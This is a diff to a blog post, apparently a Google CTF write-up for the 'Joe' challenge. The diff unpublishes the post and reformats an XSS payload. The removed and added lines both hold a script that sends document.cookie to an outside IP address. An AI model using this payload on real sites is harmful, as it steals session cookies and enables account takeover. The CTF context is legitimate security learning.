@@ -1,7 +1,5 @@
 ---
-layout: post
-title: Write For Joe: google CTF
-published: true
+published: false
 ---
 ## Joe Challenge writeup: Google ctf
 
@@ -52,7 +50,7 @@ But after trying a few times I am still not able to exploit this feature. So i d
 
 I found that the above URL could be used to log into my account with a valid JWT, and proceeded to change Joe's name to the following payload
 
-**<script>img = new Image(); img.src="https://139.59.74.204/cookie?q="+document.cookie;alert("done");</script>**
+```<script>img = new Image(); img.src="https://139.59.74.204/cookie?q="+document.cookie;alert("done");//</script>```
 
 ![selfxss.png]({{site.baseurl}}/_posts/selfxss.png)
 
